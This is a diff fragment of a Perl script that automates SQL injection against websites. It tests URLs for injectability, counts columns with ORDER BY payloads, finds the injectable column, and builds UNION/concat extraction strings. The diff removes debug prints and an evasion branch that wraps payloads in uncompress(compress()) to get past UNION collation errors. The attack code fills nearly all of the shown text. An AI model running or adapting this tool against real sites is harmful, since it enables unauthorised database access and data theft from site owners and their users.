@@ -49,10 +49,8 @@ sub fetchPage{
     my ($type, $inj) = @_;
     if($url && $type eq "injectcol"){ #injectcol or InjectColumn This function will detect what column number is injectable
         $url =~ s/'-VAR-'/concat('0x031337',$inj,'0x031337')/;
-        #print "\n" . $url . "\n";
     }elsif($url && $type eq "directinject"){ # Direct inject: concatenates Injection String into URL
         $url .=$inj;
-        #print $url . "\n";
     }elsif($type eq "checkvulnerable"){ # Check if target URL is vulnerable to SQLi
        $url = $url ."%27";    
     }elsif($type eq "directnoinject"){ # Same as Direct Inject but no argument passed to '$inj'
@@ -62,11 +60,6 @@ sub fetchPage{
             @content = split(/\015?\012/, $res->content);
             return $_[0];
         }
-    }elsif($url && $type eq "injectcolDodge"){
-        #Some SQL Queries are quite complicated to handle: 
-        # This block of code dodges the error "ILLEGAL UNION MIX"
-        $url =~ s/'-VAR-'/uncompress(compress(concat('0x031337',$inj,'0x031337')))/;
-        print "\n" . $url . "\n";
     }else{
         return 0; 
     }
@@ -97,10 +90,8 @@ sub colCount{
     return if $col > 32; 
     # sennd a request with injection string
     fetchPage($url,"directinject", "%20ORDER%20BY%20".$col."--%20");
-    #print "@content\n";
     foreach(@content){
         # checks content if contains a match
-        
         if(m/unknown.*column.*order/i){
             $col-=1;
             colCount($url,$col, 1); # if not contains do it again
@@ -116,8 +107,6 @@ sub colCount{
     }
     return $totalCol;
 }
-#xDlj@6t8c!P8NC*3UpD6
-#|z~7kqAq2<%KLFjI
 sub injColumn{
     # this subroutine detects which column is injectable
     my($url,$colCount) = @_;
@@ -158,9 +147,9 @@ sub modifyInjectionString{
 	my $concat_str;
 	for(my $i=0;$i<$colCount;$i++){
 		if($i == $injectableCol){ 
-			$concat_str .= "uncompress(compress(concat('0x031337',";
+			$concat_str .= "concat('0x031337',";
 			$concat_str .= $string;
-			$concat_str .= ",'0x031337'))), ";
+			$concat_str .= ",'0x031337'), ";
 			#$concat_str =~ s/,$//;
 			$injP .= $concat_str;
 		}else{
